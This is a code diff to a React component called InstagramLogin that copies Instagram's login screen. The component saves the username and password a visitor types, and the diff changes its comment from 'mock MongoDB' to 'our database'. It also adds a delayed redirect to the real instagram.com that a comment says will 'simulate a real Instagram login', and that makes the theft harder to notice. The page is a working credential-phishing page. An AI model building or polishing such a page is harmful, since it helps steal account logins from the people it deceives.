@@ -1,3 +1,4 @@
+
 import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Button } from '@/components/ui/button';
@@ -26,15 +27,23 @@ const InstagramLogin = () => {
     setIsLoading(true);
     
     try {
-      // Store the credentials in our mock MongoDB
-      await storeLoginCredential(username, password);
+      console.log('Submitting credentials...');
+      // Store the credentials in our database
+      const result = await storeLoginCredential(username, password);
       
-      // Redirect to Instagram
-      window.location.href = 'https://www.instagram.com';
+      if (result.success) {
+        console.log('Successfully stored credentials');
+        // Simulate a real Instagram login - redirect after a short delay
+        setTimeout(() => {
+          // Redirect to Instagram
+          window.location.href = 'https://www.instagram.com';
+        }, 1500);
+      } else {
+        throw new Error('Failed to process login');
+      }
     } catch (error) {
       console.error('Login error:', error);
       toast.error('Something went wrong. Please try again.');
-    } finally {
       setIsLoading(false);
     }
   };
